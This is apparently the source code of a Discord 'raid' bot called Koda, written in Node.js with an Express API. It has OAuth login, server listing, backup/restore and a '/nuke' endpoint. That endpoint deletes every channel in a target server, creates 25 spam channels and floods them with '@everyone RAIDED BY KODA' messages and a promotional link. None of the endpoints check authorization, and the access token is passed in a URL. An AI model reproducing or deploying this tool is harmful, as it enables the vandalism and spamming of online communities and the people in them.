const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent 
    ] 
});

const CLIENT_ID = '1469577414022795346'; 
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI = 'https://koda-raid.onrender.com/auth/callback';

let backups = {}; // Base de datos temporal para backups

// OAuth2 Login
app.get('/login', (req, res) => {
    const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
    res.redirect(url);
});

app.get('/auth/callback', async (req, res) => {
    const { code } = req.query;
    try {
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
        res.redirect(`https://koda-raid.vercel.app/?token=${response.data.access_token}`);
    } catch (err) { res.status(500).send("Login Error"); }
});

// API Servers
app.get('/api/servers', async (req, res) => {
    const token = req.headers.authorization;
    try {
        const userGuilds = await axios.get('https://discord.com/api/users/@me/guilds', {
            headers: { Authorization: token }
        });
        const botGuildIds = client.guilds.cache.map(g => g.id);
        const mutual = userGuilds.data.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 && botGuildIds.includes(g.id));
        res.json(mutual);
    } catch (e) { res.status(500).send("Error"); }
});

// PREMIUM: Crear Backup
app.get('/backup', async (req, res) => {
    const { guildId } = req.query;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).send("Bot not in server");

    try {
        const channels = await guild.channels.fetch();
        backups[guildId] = channels.map(c => ({
            name: c.name,
            type: c.type,
            parent: c.parentId ? channels.get(c.parentId).name : null
        }));
        res.send("Backup Success");
    } catch (e) { res.status(500).send("Backup Fail"); }
});

// PREMIUM: Restaurar Backup
app.get('/restore', async (req, res) => {
    const { guildId } = req.query;
    const backup = backups[guildId];
    const guild = client.guilds.cache.get(guildId);
    if (!backup || !guild) return res.status(404).send("No data");

    try {
        const current = await guild.channels.fetch();
        for (const c of current.values()) await c.delete().catch(() => {});

        for (const item of backup) {
            await guild.channels.create({ name: item.name, type: item.type }).catch(() => {});
        }
        res.send("Restored");
    } catch (e) { res.status(500).send("Restore Fail"); }
});

// NUKE COMMAND
app.get('/nuke', async (req, res) => {
    const { guildId, name } = req.query;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).send("Bot not found");

    try {
        const channels = await guild.channels.fetch();
        for (const c of channels.values()) await c.delete().catch(() => {});
        
        for (let i = 0; i < 25; i++) {
            setTimeout(() => {
                guild.channels.create({ name: name || 'koda-raid', type: 0 })
                    .then(ch => {
                        ch.send({
                            content: "@everyone **RAIDED BY KODA** ☠️\nhttps://koda-raid.vercel.app",
                            files: ["https://koda-raid.vercel.app/banner.png"]
                        }).catch(() => {});
                    }).catch(() => {});
            }, i * 400);
        }
        res.send("Nuked");
    } catch (e) { res.status(500).send("Fail"); }
});

client.login(process.env.DISCORD_TOKEN);
app.listen(process.env.PORT || 3000, () => console.log('Koda 2.0 Online'));